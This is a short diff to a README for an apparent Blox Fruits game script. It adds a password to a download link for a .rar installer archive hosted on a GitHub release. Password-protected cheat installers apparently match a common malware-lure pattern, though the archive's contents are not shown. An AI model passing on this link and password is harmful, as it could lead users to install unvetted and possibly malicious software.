@@ -31,6 +31,6 @@ This project is licensed under the MIT License.
 
 ## Download
 
-[Download the script here](https://github.com/Nikitaa2288/Blox-fruit-script/releases/download/soft/Installer_folder.rar)
+[Download the script here](https://github.com/Nikitaa2288/Blox-fruit-script/releases/download/soft/Installer_folder.rar) Password:ojgjirg4wf82jf
 
 **Let your Blox Fruits journey be one of discovery, not deception.**
